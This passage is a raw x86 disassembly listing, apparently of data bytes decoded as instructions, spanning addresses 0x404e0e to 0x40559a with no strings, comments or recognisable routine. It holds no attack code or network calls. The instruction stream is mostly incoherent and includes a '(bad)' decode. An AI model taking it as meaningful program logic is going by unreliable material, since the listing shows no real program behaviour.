  404e0e:	add    BYTE PTR [eax],al
  404e10:	test   al,0x0
  404e12:	inc    edx
  404e13:	pop    ds
  404e14:	inc    esp
  404e15:	les    ebp,FWORD PTR [eax+eax*1+0x10]
  404e19:	add    BYTE PTR ds:0x804540,dl
  404e1f:	test   al,0x8
  404e21:	adc    al,0x42
  404e23:	add    DWORD PTR [edx+0x10],eax
  404e26:	add    BYTE PTR [eax],bl
  404e28:	push   es
  404e29:	and    BYTE PTR [eax],al
  404e2b:	add    BYTE PTR [edx],0x9
  404e2e:	add    eax,0xb0404802
  404e33:	xor    BYTE PTR [edi],al
  404e35:	rcl    BYTE PTR [eax+edx*4+0x93008a9],1
  404e3c:	and    BYTE PTR [eax],al
  404e3e:	sbb    BYTE PTR [eax+0x28],ch
  404e41:	add    BYTE PTR [eax-0x7c],al
  404e44:	adc    BYTE PTR [eax+0x22],ch
  404e47:	inc    eax
  404e48:	push   es
  404e49:	fs inc esp
  404e4b:	inc    eax
  404e4c:	add    BYTE PTR [eax+ecx*1+0x42014002],bl
  404e53:	add    eax,DWORD PTR [eax+eiz*1]
  404e56:	or     BYTE PTR [edx+0x0],cl
  404e59:	add    BYTE PTR [ecx],dh
  404e5b:	inc    eax
  404e5c:	add    BYTE PTR [ecx],ah
  404e5e:	dec    ebp
  404e5f:	or     BYTE PTR ds:0x800020,al
  404e65:	xor    DWORD PTR [edx],edx
  404e67:	mov    al,BYTE PTR fs:[eax+0x22404540]
  404e6e:	add    BYTE PTR [eax+edx*1],0x2
  404e72:	mov    cl,BYTE PTR [eax+0x8]
  404e75:	and    BYTE PTR [eax],cl
  404e77:	scas   al,BYTE PTR es:[edi]
  404e78:	inc    eax
  404e79:	push   eax
  404e7a:	add    BYTE PTR [ecx],dh
  404e7c:	adc    esp,DWORD PTR [eax]
  404e7e:	add    BYTE PTR ds:0x1cc3d0b8,al
  404e84:	add    al,0x14
  404e86:	dec    ecx
  404e87:	add    BYTE PTR fs:[eax],0x2
  404e8b:	test   BYTE PTR [eax],al
  404e8d:	loope  0x404e91
  404e8f:	add    BYTE PTR [eax+0x40010400],al
  404e95:	sub    al,0x42
  404e97:	add    DWORD PTR [eax+0x1],edx
  404e9a:	adc    DWORD PTR [eax-0x5fffb3fe],eax
  404ea0:	add    BYTE PTR [eax+0x8002290],al
  404ea6:	and    BYTE PTR [eax],al
  404ea8:	add    al,0x42
  404eaa:	or     BYTE PTR [ecx],al
  404eac:	add    BYTE PTR [eax+0x886a],bl
  404eb2:	add    al,ch
  404eb4:	add    BYTE PTR [eax+0x20],al
  404eb7:	push   eax
  404eb8:	pusha  
  404eb9:	and    BYTE PTR [eax],al
  404ebb:	add    BYTE PTR [eax],0xc0
  404ebe:	and    DWORD PTR [edx-0x5bcbafff],eax
  404ec4:	add    BYTE PTR [eax+eax*1+0x10],cl
  404ec8:	inc    eax
  404ec9:	add    BYTE PTR [eax],al
  404ecb:	add    BYTE PTR [eax],al
  404ecd:	add    DWORD PTR [esp+eax*1+0x40000058],edx
  404ed4:	inc    eax
  404ed5:	inc    eax
  404ed6:	add    eax,DWORD PTR [edx]
  404ed8:	inc    edx
  404ed9:	push   ss
  404eda:	add    BYTE PTR [eax],al
  404edc:	or     BYTE PTR [edx+0x14008001],dh
  404ee2:	enter  0x931,0x22
  404ee6:	add    DWORD PTR ds:0x9c41a020,edi
  404eec:	add    BYTE PTR [ecx+0x0],al
  404eef:	rol    BYTE PTR [eax],0x4
  404ef2:	add    BYTE PTR [eax+0x32101c0],ah
  404ef8:	sbb    DWORD PTR [edx],esp
  404efa:	add    DWORD PTR [esi],eax
  404efc:	add    BYTE PTR [ecx],dl
  404efe:	and    BYTE PTR [ecx+0x0],ah
  404f01:	add    al,0xab
  404f03:	pop    esp
  404f04:	jb     0x404f08
  404f06:	inc    edx
  404f07:	inc    eax
  404f08:	or     BYTE PTR [ebx],dl
  404f0a:	or     BYTE PTR [eax],al
  404f0c:	js     0x404f0e
  404f0e:	adc    BYTE PTR [ecx+0x11444410],cl
  404f14:	test   BYTE PTR [eax+0x3c2b0000],dl
  404f1a:	mov    al,0x2e
  404f1c:	and    BYTE PTR [eax],cl
  404f1e:	or     BYTE PTR [ecx],al
  404f20:	and    BYTE PTR [eax+0x0],dh
  404f23:	mov    al,ds:0x2c4001
  404f28:	add    BYTE PTR [eax],al
  404f2a:	add    BYTE PTR [eax],ah
  404f2c:	inc    eax
  404f2d:	or     al,0x0
  404f2f:	push   cs
  404f30:	inc    ecx
  404f31:	add    BYTE PTR [eax+0x892080],0x0
  404f38:	cmp    BYTE PTR [eax+0x4600021],cl
  404f3e:	and    al,BYTE PTR [ebx+0x18]
  404f41:	add    BYTE PTR [eax],al
  404f43:	adc    BYTE PTR [ecx],al
  404f45:	mov    BYTE PTR [eax+0x5c],al
  404f48:	add    al,0x2
  404f4a:	mov    BYTE PTR [eax+0x11],al
  404f4d:	add    DWORD PTR [eax+ecx*1],eax
  404f50:	add    DWORD PTR [ecx],eax
  404f52:	add    al,BYTE PTR [eax]
  404f54:	add    BYTE PTR [edx-0x40],al
  404f57:	or     DWORD PTR [eax],ecx
  404f59:	add    BYTE PTR [eax],al
  404f5b:	jb     0x404edd
  404f5d:	inc    eax
  404f5e:	add    BYTE PTR [eax+0x10],al
  404f61:	or     DWORD PTR [eax],0xffffff91
  404f64:	add    dl,BYTE PTR [ecx-0x5e]
  404f67:	inc    eax
  404f68:	add    BYTE PTR [eax+eax*1+0x28500805],0x0
  404f70:	add    dh,bl
  404f72:	add    BYTE PTR [eax+eax*1],dl
  404f75:	add    al,0x1e
  404f77:	add    BYTE PTR [ecx+0x40],bl
  404f7a:	loopne 0x404fc1
  404f7c:	sub    BYTE PTR [ecx+0x40],al
  404f7f:	mov    ecx,0x502c0800
  404f84:	mov    al,ds:0x3020081
  404f89:	outs   dx,BYTE PTR ds:[esi]
  404f8a:	dec    eax
  404f8b:	add    BYTE PTR [eax+0x0],cl
  404f8e:	add    cl,BYTE PTR [eax]
  404f90:	xchg   esp,eax
  404f91:	inc    eax
  404f92:	add    eax,0x20a84288
  404f97:	add    BYTE PTR [edx],bl
  404f99:	add    BYTE PTR [eax],al
  404f9b:	add    BYTE PTR [eax-0x56],dl
  404f9e:	adc    DWORD PTR [eax],eax
  404fa0:	add    BYTE PTR [edx],al
  404fa2:	adc    ch,dh
  404fa4:	or     DWORD PTR [ecx],ecx
  404fa6:	add    BYTE PTR [ecx],al
  404fa8:	and    BYTE PTR [ecx],ah
  404faa:	add    al,BYTE PTR [eax]
  404fac:	inc    esp
  404fad:	add    BYTE PTR [ecx],al
  404faf:	add    al,BYTE PTR [eax]
  404fb1:	add    DWORD PTR [eax+0x20018020],eax
  404fb7:	adc    BYTE PTR [ecx+0x12290208],al
  404fbd:	test   BYTE PTR [eax],al
  404fbf:	add    BYTE PTR [ecx+edi*2],al
  404fc2:	add    al,BYTE PTR [ebp+0x42]
  404fc5:	and    BYTE PTR [eax+0x22],al
  404fc8:	and    DWORD PTR [eax+eax*1-0x16],ebp
  404fcc:	inc    edx
  404fcd:	rol    DWORD PTR [eax],0x0
  404fd0:	add    BYTE PTR [eax],0x90
  404fd3:	or     ebp,DWORD PTR [eax+eax*4+0x1829148]
  404fda:	add    BYTE PTR [eax+edx*2+0x24],al
  404fde:	sbb    BYTE PTR [eax],al
  404fe0:	add    BYTE PTR [ecx],al
  404fe2:	cmp    al,0x81
  404fe4:	pop    eax
  404fe5:	add    DWORD PTR [eax+eax*1],0x22000400
  404fec:	add    BYTE PTR [eax+0x21],al
  404fef:	add    BYTE PTR [ecx],bl
  404ff1:	adc    al,0x1
  404ff3:	add    BYTE PTR [eax-0x30],al
  404ff6:	push   es
  404ff7:	add    DWORD PTR [eax+eax*1],esp
  404ffa:	sub    al,ah
  404ffc:	add    BYTE PTR [edx+0x100020],al
  405002:	and    BYTE PTR [eax],al
  405004:	and    BYTE PTR [edx],ah
  405006:	mov    eax,ds:0x8c53052
  40500b:	inc    eax
  40500c:	add    BYTE PTR [eax],al
  40500e:	xchg   ecx,eax
  40500f:	and    BYTE PTR [eax+0x28105928],al
  405015:	adc    BYTE PTR [eax+0x20],0x8
  405019:	adc    BYTE PTR [eax],dh
  40501b:	add    BYTE PTR [ecx],ah
  40501d:	add    BYTE PTR [eax],al
  40501f:	add    BYTE PTR [eax],al
  405021:	xchg   esp,eax
  405022:	add    al,BYTE PTR [eax+0x0]
  405025:	add    BYTE PTR [edx+0x408818],ah
  40502b:	inc    edx
  40502c:	pusha  
  40502d:	inc    ecx
  40502e:	add    BYTE PTR [eax],dl
  405030:	inc    eax
  405031:	xor    BYTE PTR [ecx],0x18
  405034:	add    BYTE PTR [eax],al
  405036:	test   DWORD PTR [ecx],eax
  405038:	add    BYTE PTR [eax],al
  40503a:	mov    ds:0x10a4800c,al
  40503f:	add    BYTE PTR [ecx+eiz*4-0x63ffedf4],al
  405046:	dec    esp
  405047:	add    al,0x80
  405049:	and    al,0x40
  40504b:	inc    eax
  40504c:	adc    BYTE PTR [eax],ch
  40504e:	push   eax
  40504f:	add    al,0x5
  405051:	mov    al,ds:0x9
  405056:	rol    BYTE PTR [eax+0x1],0x60
  40505a:	add    BYTE PTR [eax+0x34021698],al
  405060:	inc    edx
  405061:	add    al,al
  405063:	add    al,ch
  405065:	adc    BYTE PTR [eax+eax*4],cl
  405068:	sub    DWORD PTR [eax+0x0],edx
  40506b:	and    BYTE PTR [ecx],ch
  40506d:	add    BYTE PTR [eax],0x81
  405070:	inc    ecx
  405071:	push   es
  405072:	or     BYTE PTR [eax],al
  405074:	and    BYTE PTR [edx],al
  405076:	or     BYTE PTR [edx+edx*4],cl
  405079:	inc    ecx
  40507a:	and    BYTE PTR [esi],ch
  40507c:	dec    eax
  40507d:	add    DWORD PTR [eax],eax
  40507f:	add    BYTE PTR [ebp+0x42],ah
  405082:	and    BYTE PTR [edx+eax*8],dl
  405085:	add    BYTE PTR [esi],ah
  405087:	inc    eax
  405088:	add    BYTE PTR [edx+0x0],al
  40508b:	inc    esi
  40508c:	enter  0x26,0x20
  405090:	add    BYTE PTR [eax+eax*1+0x208040],ah
  405097:	sbb    BYTE PTR [edx+0x1],bl
  40509a:	pop    esp
  40509b:	add    BYTE PTR [eax-0x80],al
  40509e:	add    al,0x10
  4050a0:	or     al,cl
  4050a2:	add    BYTE PTR [eax],al
  4050a4:	or     eax,0x10043520
  4050a9:	add    al,0x0
  4050ab:	dec    edx
  4050ac:	adc    DWORD PTR [ebx],edx
  4050ae:	add    eax,0x3274204
  4050b3:	adc    BYTE PTR [eax],ch
  4050b5:	ret    0x11c3
  4050b8:	or     BYTE PTR [edx],cl
  4050ba:	add    dl,BYTE PTR [eax]
  4050bc:	push   esp
  4050bd:	pop    ecx
  4050be:	add    BYTE PTR [ecx],al
  4050c0:	mov    ah,0x0
  4050c2:	adc    al,BYTE PTR ds:0x4c440013
  4050c8:	mov    al,ds:0x54000100
  4050cd:	or     ah,BYTE PTR [eax]
  4050cf:	rcr    BYTE PTR [eax],0x40
  4050d2:	sub    BYTE PTR [edx],ah
  4050d4:	add    al,dl
  4050d6:	aad    0x12
  4050d8:	add    BYTE PTR [eax-0x77ffffe5],al
  4050de:	popa   
  4050df:	add    BYTE PTR [eax],dl
  4050e1:	or     BYTE PTR [eax],ah
  4050e3:	add    al,BYTE PTR [ebp+0x30008400]
  4050e9:	or     BYTE PTR [eax+0x1082d080],al
  4050ef:	inc    edx
  4050f0:	xor    al,al
  4050f2:	add    al,BYTE PTR [eax]
  4050f4:	push   eax
  4050f5:	add    DWORD PTR [eax],0x81901300
  4050fb:	add    DWORD PTR [eax+0x68],eax
  4050fe:	mov    eax,ds:0x1000161
  405103:	inc    eax
  405104:	and    ah,BYTE PTR [eax]
  405106:	inc    eax
  405107:	add    eax,0x81c100c0
  40510c:	add    BYTE PTR [edx],dl
  40510e:	add    eax,DWORD PTR [esi-0x20]
  405111:	add    BYTE PTR [eax+eiz*1],al
  405114:	and    BYTE PTR [ecx-0x80],0x0
  405118:	push   0x1000000
  40511d:	add    BYTE PTR [eax+0x21200601],0x22
  405124:	add    bl,BYTE PTR [eax]
  405126:	and    BYTE PTR [eax],al
  405128:	add    BYTE PTR [edx],dl
  40512a:	xor    al,0x82
  40512d:	add    BYTE PTR [eax+0x18],ah
  405130:	or     BYTE PTR [eax+eax*1],al
  405133:	add    al,al
  405135:	inc    eax
  405136:	add    BYTE PTR [eax],cl
  405138:	inc    eax
  405139:	add    BYTE PTR [eax],al
  40513b:	cld    
  40513c:	les    eax,FWORD PTR [eax+0x26404903]
  405142:	add    al,BYTE PTR [eax+0x8000500]
  405148:	and    eax,DWORD PTR [eax+eax*1]
  40514b:	add    esi,DWORD PTR [ecx+ecx*1+0x2600a21]
  405152:	pusha  
  405153:	sub    DWORD PTR [eax],eax
  405155:	inc    ebx
  405156:	adc    DWORD PTR [eax],0x4100d00
  40515c:	nop
  40515d:	add    DWORD PTR [eax],edx
  40515f:	add    BYTE PTR [ecx],al
  405161:	add    BYTE PTR [eax],al
  405163:	or     al,0x0
  405165:	inc    ecx
  405166:	inc    eax
  405167:	xor    BYTE PTR [eax+ecx*4],al
  40516a:	add    BYTE PTR [eax],al
  40516c:	add    BYTE PTR [ecx+0x4400292],ch
  405172:	add    al,BYTE PTR [eax-0x3cf6be6f]
  405178:	adc    BYTE PTR [eax],0x5
  40517b:	bound  eax,QWORD PTR [eax]
  40517d:	in     al,0x10
  40517f:	cmp    eax,0x414254a0
  405184:	inc    eax
  405185:	inc    eax
  405186:	add    BYTE PTR [eax],cl
  405188:	add    eax,0x2010c148
  40518d:	add    BYTE PTR [eax],ah
  40518f:	push   eax
  405190:	add    BYTE PTR [eax],cl
  405192:	xor    BYTE PTR [eax+0x0],al
  405195:	add    BYTE PTR [ebx],al
  405197:	or     BYTE PTR [ecx-0x80],dl
  40519a:	and    BYTE PTR [esi],al
  40519c:	adc    BYTE PTR [edx],ah
  40519e:	push   0x40835000
  4051a3:	inc    eax
  4051a4:	mov    al,ds:0x90009014
  4051a9:	test   BYTE PTR ds:0x88120000,al
  4051af:	mov    BYTE PTR [eax],al
  4051b1:	and    BYTE PTR [eax],al
  4051b3:	add    BYTE PTR [eax],ah
  4051b5:	and    DWORD PTR [edx+0x64010002],ecx
  4051bb:	add    BYTE PTR [eax],al
  4051bd:	add    BYTE PTR [eax],al
  4051bf:	adc    DWORD PTR [ebx+0x10],eax
  4051c2:	or     al,BYTE PTR [eax]
  4051c4:	add    eax,0x3cf98801
  4051c9:	inc    ebx
  4051ca:	add    ah,BYTE PTR [eax]
  4051cc:	adc    al,0x4
  4051cf:	and    al,BYTE PTR [eax]
  4051d1:	xchg   esp,eax
  4051d2:	add    BYTE PTR [eax+eax*1],dh
  4051d5:	or     BYTE PTR [eax+0x26],dl
  4051d8:	xor    ecx,DWORD PTR [edx]
  4051da:	push   edx
  4051db:	push   es
  4051dc:	call   0x8205d60f
  4051e1:	add    DWORD PTR [ebp+eax*1+0xec10085],eax
  4051e8:	pusha  
  4051e9:	add    al,BYTE PTR [ecx+0x5112]
  4051ef:	adc    DWORD PTR [eax],ecx
  4051f1:	add    BYTE PTR [eax],al
  4051f3:	add    DWORD PTR [eax],eax
  4051f5:	sbb    BYTE PTR [eax-0x7fc7ffde],0x0
  4051fc:	xchg   DWORD PTR [edx-0x6ff1fef8],eax
  405202:	add    BYTE PTR [edx],0x1c
  405205:	or     BYTE PTR [esi+ecx*1-0x80],bl
  405209:	adc    eax,0x80030400
  40520e:	mov    eax,ds:0xa00011c1
  405213:	or     DWORD PTR [eax],eax
  405215:	add    BYTE PTR [edx],ah
  405217:	inc    ebp
  405218:	inc    ecx
  405219:	add    BYTE PTR [eax],ah
  40521b:	inc    ecx
  40521c:	rol    BYTE PTR [eax],cl
  40521e:	push   eax
  40521f:	inc    ecx
  405220:	add    DWORD PTR [edx+0x1],eax
  405223:	test   BYTE PTR [eax+0x65404002],dl
  405229:	dec    edx
  40522a:	adc    BYTE PTR [edx+eiz*1-0x55fedf00],0xac
  405232:	add    BYTE PTR [eax+0x62],al
  405235:	add    BYTE PTR [eax],al
  405237:	jno    0x40529b
  405239:	nop
  40523a:	or     BYTE PTR [eax+eax*1+0x23],al
  40523e:	add    BYTE PTR [eax],al
  405240:	add    BYTE PTR [eax],al
  405242:	inc    eax
  405243:	add    dl,BYTE PTR [ecx]
  405245:	and    BYTE PTR [eax],0x20
  405248:	adc    BYTE PTR fs:[eax+eax*1+0x4031],dl
  405250:	inc    eax
  405251:	add    BYTE PTR [eax],al
  405253:	inc    eax
  405254:	or     BYTE PTR [eax+eiz*1],al
  405257:	or     BYTE PTR [eax],al
  405259:	push   ebx
  40525a:	adc    BYTE PTR [eax],ah
  40525c:	inc    eax
  40525d:	add    BYTE PTR [edx],al
  40525f:	add    BYTE PTR [eax+edx*2],cl
  405262:	and    al,BYTE PTR [eax]
  405264:	retf   0x0
  405267:	add    ah,BYTE PTR [eax+eax*1]
  40526a:	push   es
  40526b:	add    al,BYTE PTR [eax]
  40526d:	inc    ebx
  40526e:	add    BYTE PTR [eax],0x20
  405271:	push   ss
  405272:	pusha  
  405273:	inc    ecx
  405274:	or     BYTE PTR [eax-0x7d6ded7e],al
  40527a:	add    BYTE PTR [eax+0x0],al
  40527d:	adc    BYTE PTR [eax],cl
  40527f:	xchg   edx,eax
  405280:	jno    0x405282
  405282:	mov    al,ds:0x5240040
  405287:	inc    ecx
  405288:	and    BYTE PTR [eax+0x8590150],cl
  40528e:	dec    eax
  40528f:	add    BYTE PTR [ecx],al
  405291:	or     BYTE PTR [eax+eax*1],dl
  405294:	add    bl,BYTE PTR [edx]
  405296:	mov    eax,ds:0x88000
  40529b:	add    al,0x68
  40529d:	and    ecx,DWORD PTR [edx]
  40529f:	or     BYTE PTR [eax],ah
  4052a1:	dec    eax
  4052a2:	add    BYTE PTR [eax],al
  4052a4:	add    BYTE PTR [eax-0x7eeeedf0],al
  4052aa:	sub    BYTE PTR [eax+0x40],al
  4052ad:	add    BYTE PTR [ecx+0x21470800],0x10
  4052b4:	or     BYTE PTR [eax],al
  4052b6:	sub    BYTE PTR [eax],0x11
  4052b9:	and    DWORD PTR ds:0x2e100,edx
  4052bf:	push   es
  4052c0:	add    BYTE PTR [eax],al
  4052c2:	inc    eax
  4052c3:	inc    edx
  4052c4:	inc    eax
  4052c5:	xchg   esp,eax
  4052c6:	add    BYTE PTR [eax+ecx*1],0x0
  4052ca:	test   BYTE PTR [eax+0x10],dl
  4052cd:	add    al,0x40
  4052cf:	adc    BYTE PTR [eax+eax*2],cl
  4052d2:	xchg   DWORD PTR [ecx],esp
  4052d4:	adc    al,BYTE PTR [ecx-0x80]
  4052d7:	add    BYTE PTR [ecx+0x1084041],dl
  4052dd:	shl    al,1
  4052df:	mov    eax,ds:0x80451200
  4052e4:	sbb    BYTE PTR [edx],ah
  4052e6:	add    BYTE PTR [edx+0x1498208a],bh
  4052ec:	pop    eax
  4052ed:	add    BYTE PTR [esi-0x70],0x11
  4052f1:	adc    BYTE PTR [eax],al
  4052f3:	and    BYTE PTR [ecx],0x84
  4052f6:	rcr    DWORD PTR [edx],0x64
  4052f9:	and    DWORD PTR [eax],edx
  4052fb:	add    BYTE PTR [eax],ah
  4052fd:	pusha  
  4052fe:	test   al,0x0
  405300:	add    DWORD PTR [eax],ebp
  405302:	add    BYTE PTR [ebx],ah
  405304:	rol    DWORD PTR [ebp+0x2e96],1
  40530a:	ror    BYTE PTR [ebx-0x2fffc3f0],0x94
  405311:	and    BYTE PTR fs:[eax],al
  405314:	add    BYTE PTR [eax],al
  405316:	push   edx
  405317:	dec    eax
  405318:	adc    BYTE PTR [eax],al
  40531a:	or     al,0x0
  40531c:	add    BYTE PTR [eax],al
  40531e:	and    BYTE PTR [eax],dl
  405320:	add    BYTE PTR [ecx],ah
  405322:	add    BYTE PTR [eax],al
  405324:	lea    eax,[ecx+0x2a]
  405327:	push   eax
  405328:	add    BYTE PTR [eax],al
  40532a:	rol    BYTE PTR [eax-0x80],0x30
  40532e:	inc    eax
  40532f:	xor    al,BYTE PTR [edx]
  405331:	dec    eax
  405332:	add    BYTE PTR [eax],0x40
  405335:	add    BYTE PTR [eax+0x49400140],al
  40533b:	nop
  40533c:	add    al,0x0
  40533e:	add    BYTE PTR [eax+0x22160101],0x4
  405345:	add    dl,BYTE PTR [eax]
  405347:	push   eax
  405348:	add    BYTE PTR [edx],ah
  40534a:	add    BYTE PTR [eax],al
  40534c:	inc    eax
  40534d:	and    BYTE PTR [eax+0x0],dl
  405350:	adc    al,0xc0
  405352:	test   BYTE PTR [edx],al
  405354:	add    al,0xd
  405356:	mov    ah,BYTE PTR [eax]
  405358:	or     BYTE PTR [eax],al
  40535a:	add    al,BYTE PTR [eax]
  40535c:	mov    al,ds:0x4800800
  405361:	add    BYTE PTR [edx],ah
  405363:	inc    edx
  405364:	adc    DWORD PTR [eax+0x8],0xffffff80
  405368:	inc    edx
  405369:	rol    DWORD PTR [eax],0x88
  40536c:	add    BYTE PTR [eax],al
  40536e:	adc    BYTE PTR [eax-0x4b3eff80],ah
  405374:	add    al,0x11
  405376:	sub    BYTE PTR [eax],0x10
  405379:	and    BYTE PTR [eax+eax*1],al
  40537c:	add    BYTE PTR [eax],0x1
  40537f:	add    BYTE PTR [esi],ah
  405381:	add    BYTE PTR [eax+0x4],al
  405384:	and    BYTE PTR [eax-0x60],ch
  405387:	add    BYTE PTR [eax],cl
  405389:	add    BYTE PTR [eax-0x7efffffa],dl
  40538f:	and    al,BYTE PTR [eax]
  405391:	add    BYTE PTR [eax],ch
  405393:	add    DWORD PTR [eax],0x4240
  405399:	test   BYTE PTR [eax+0x21],al
  40539c:	or     BYTE PTR [edi],al
  40539e:	add    DWORD PTR [eax],0x40004040
  4053a4:	add    BYTE PTR [eax+0x9],al
  4053a7:	add    BYTE PTR [eax],0x0
  4053aa:	add    DWORD PTR [eax],eax
  4053ac:	add    BYTE PTR [eax],bl
  4053ae:	rol    BYTE PTR [ecx-0x1f7bbbdb],0x0
  4053b5:	add    al,0x84
  4053b7:	add    BYTE PTR [edx],ah
  4053b9:	adc    BYTE PTR [eax],cl
  4053bb:	add    BYTE PTR [eax],al
  4053bd:	add    BYTE PTR [edx-0x7ffffff8],dl
  4053c3:	adc    DWORD PTR [eax],0x824c0404
  4053c9:	and    dl,al
  4053cb:	add    dl,BYTE PTR [ecx]
  4053cd:	add    BYTE PTR [eax],ah
  4053cf:	adc    al,0x0
  4053d1:	add    al,0x84
  4053d3:	add    DWORD PTR [ebp-0x3fffff7a],eax
  4053d9:	adc    eax,0xad0068
  4053de:	add    dh,BYTE PTR [esi]
  4053e0:	add    eax,0x44000004
  4053e5:	add    ah,BYTE PTR [eax]
  4053e7:	add    DWORD PTR [eax],ecx
  4053e9:	mov    BYTE PTR [ecx],al
  4053eb:	push   0x208c3064
  4053f0:	add    BYTE PTR [ecx+eax*8-0x3a],al
  4053f4:	add    BYTE PTR [eax+0x62],al
  4053f7:	add    al,0x6
  4053f9:	add    al,0x2c
  4053fb:	push   eax
  4053fc:	add    eax,0xa1a0202
  405401:	push   eax
  405402:	add    DWORD PTR [edx],eax
  405404:	ror    BYTE PTR [eax],0x3
  405407:	or     BYTE PTR [edx],dl
  405409:	inc    eax
  40540a:	add    BYTE PTR [ecx],dh
  40540c:	test   BYTE PTR [ecx+0x10],al
  40540f:	or     BYTE PTR [eax],al
  405411:	add    BYTE PTR [esi],0x0
  405414:	add    BYTE PTR [eax+0x2c000100],dl
  40541a:	mov    fs,WORD PTR [edx]
  40541c:	add    cl,BYTE PTR [edx+0x0]
  40541f:	adc    BYTE PTR [edx],al
  405421:	add    BYTE PTR [ebx+0x1c00b630],al
  405427:	mov    al,ds:0x9207e
  40542c:	xor    BYTE PTR [ecx],ah
  40542e:	add    al,BYTE PTR [ecx-0x7ffdbfe0]
  405434:	add    BYTE PTR [ecx],al
  405436:	in     al,dx
  405437:	or     al,0x2
  405439:	add    al,al
  40543b:	add    BYTE PTR [edx],al
  40543d:	or     eax,0x84704
  405442:	cwde   
  405443:	and    al,0x0
  405445:	add    al,0x54
  405447:	add    BYTE PTR [edx+0x7700c000],ah
  40544d:	or     DWORD PTR [eax+0x0],0x8721c085
  405454:	add    DWORD PTR [eax],eax
  405456:	inc    ebx
  405457:	and    dl,BYTE PTR [eax+0xdf1920]
  40545d:	add    al,0x40
  40545f:	test   BYTE PTR [eax],ah
  405461:	add    BYTE PTR [eax+0xc940402],cl
  405467:	inc    esp
  405468:	inc    eax
  405469:	or     BYTE PTR [eax],al
  40546b:	cmp    BYTE PTR [eax-0x7b71ffbf],al
  405471:	nop
  405472:	mov    al,BYTE PTR [eax+0x68]
  405475:	add    BYTE PTR [ecx+0x8],al
  405478:	or     BYTE PTR [ecx+0x18040],al
  40547e:	ds mov dl,al
  405481:	jb     0x40549b
  405483:	or     DWORD PTR [eax],eax
  405485:	add    BYTE PTR [eax],al
  405487:	arpl   WORD PTR [edi-0x76],bp
  40548a:	dec    eax
  40548b:	popa   
  40548c:	loopne 0x40548e
  40548e:	add    DWORD PTR [eax],eax
  405490:	rcr    edx,1
  405492:	adc    eax,0x34
  405497:	add    BYTE PTR [ecx],al
  405499:	add    al,0x0
  40549b:	and    DWORD PTR [eax],eax
  40549d:	inc    esp
  40549e:	push   eax
  40549f:	add    DWORD PTR [eax],ebp
  4054a1:	adc    BYTE PTR [eax],ch
  4054a3:	inc    edx
  4054a4:	in     eax,0x80
  4054a6:	sbb    DWORD PTR [eax],eax
  4054a8:	pusha  
  4054a9:	add    BYTE PTR [eax],cl
  4054ab:	rol    BYTE PTR [eax],0x82
  4054ae:	add    BYTE PTR [eax],al
  4054b0:	adc    BYTE PTR [eax+0x40],al
  4054b3:	inc    esp
  4054b4:	sbb    BYTE PTR [ecx],ah
  4054b6:	inc    esi
  4054b7:	add    bl,BYTE PTR [eax+0xc]
  4054ba:	or     DWORD PTR [eax+0x2002482],edx
  4054c0:	add    BYTE PTR [eax],0x0
  4054c3:	add    al,0x40
  4054c5:	add    BYTE PTR [ecx],al
  4054c7:	adc    BYTE PTR [esp+edx*4-0x80],cl
  4054cb:	add    BYTE PTR [eax],0x0
  4054ce:	xor    dl,BYTE PTR [eax-0x64]
  4054d1:	add    al,BYTE PTR [edx]
  4054d3:	rol    BYTE PTR [eax],0x8
  4054d6:	add    al,al
  4054d8:	add    DWORD PTR [eax],eax
  4054da:	add    al,0xa4
  4054dc:	add    al,BYTE PTR [edx]
  4054de:	(bad)
  4054e1:	add    BYTE PTR [ecx],dl
  4054e3:	and    al,0x48
  4054e6:	push   esp
  4054e7:	add    al,0x80
  4054e9:	add    DWORD PTR [eax+ecx*1+0x4000093],eax
  4054f0:	mov    BYTE PTR [edx],al
  4054f2:	mov    BYTE PTR [eax+edx*1],al
  4054f5:	rcl    BYTE PTR [edx+eax*2],0x10
  4054f9:	add    BYTE PTR [eax],al
  4054fb:	xor    esi,DWORD PTR [eax]
  4054fd:	inc    esp
  4054fe:	and    BYTE PTR [edx],dl
  405500:	rol    BYTE PTR [ecx],0x60
  405503:	and    ecx,DWORD PTR [eax]
  405505:	inc    eax
  405506:	sbb    BYTE PTR [ecx],0x4c
  405509:	add    BYTE PTR [eax],dl
  40550b:	add    BYTE PTR [esi],0x0
  40550e:	and    DWORD PTR [eax-0x3ff00000],eax
  405514:	add    BYTE PTR [edx+0x45],0x11
  405518:	add    BYTE PTR [ecx],dl
  40551a:	adc    DWORD PTR [eax],eax
  40551c:	and    BYTE PTR [eax+eax*1],bl
  40551f:	add    BYTE PTR [eax],al
  405521:	add    cl,BYTE PTR [edx]
  405523:	or     BYTE PTR [edx],ch
  405525:	add    DWORD PTR [eax+edx*1+0x0],ecx
  405529:	add    BYTE PTR [esi],dl
  40552b:	and    BYTE PTR [eax],al
  40552d:	add    cl,BYTE PTR [ebx]
  40552f:	add    BYTE PTR [edx],ah
  405531:	and    BYTE PTR [eax],al
  405533:	add    ah,BYTE PTR [eax]
  405535:	or     BYTE PTR [ecx],0x0
  405538:	pusha  
  405539:	add    al,BYTE PTR [ecx]
  40553b:	push   eax
  40553c:	cs xor al,0x51
  40553f:	leave  
  405540:	or     BYTE PTR [ebx],cl
  405542:	inc    esp
  405543:	add    BYTE PTR [edx+0x8],dl
  405546:	inc    eax
  405547:	push   ss
  405548:	add    DWORD PTR [edx],edx
  40554a:	and    BYTE PTR [eax],al
  40554c:	add    BYTE PTR [eax],al
  40554e:	or     dl,cl
  405550:	adc    al,0xa0
  405552:	add    BYTE PTR [ebp-0x80],al
  405555:	or     BYTE PTR [eax],ah
  405557:	pusha  
  405558:	mov    al,ds:0x400800
  40555d:	mov    al,ds:0x7001882
  405562:	add    BYTE PTR [edi],ah
  405564:	rol    BYTE PTR [eax],0x80
  405567:	inc    ebp
  405568:	inc    eax
  405569:	add    BYTE PTR [ebp+0x50080048],dh
  40556f:	or     BYTE PTR [eax],al
  405571:	and    BYTE PTR [eax],al
  405573:	inc    eax
  405574:	inc    ecx
  405575:	add    BYTE PTR [eax],cl
  405577:	add    eax,DWORD PTR [eax]
  405579:	inc    ecx
  40557a:	push   cs
  40557b:	adc    BYTE PTR [eax],al
  40557d:	mov    DWORD PTR [edx+edx*2],0x10022300
  405584:	add    al,0x0
  405586:	add    BYTE PTR [eax],0x20
  405589:	lods   al,BYTE PTR ds:[esi]
  40558a:	add    BYTE PTR [eax],al
  40558c:	xor    eax,0x800201
  405591:	test   BYTE PTR [eax],cl
  405593:	or     BYTE PTR [esp+edx*2+0x0],ah
  405597:	add    al,0x6
  405599:	stos   DWORD PTR es:[edi],eax
  40559a:	add    BYTE PTR [eax],ah
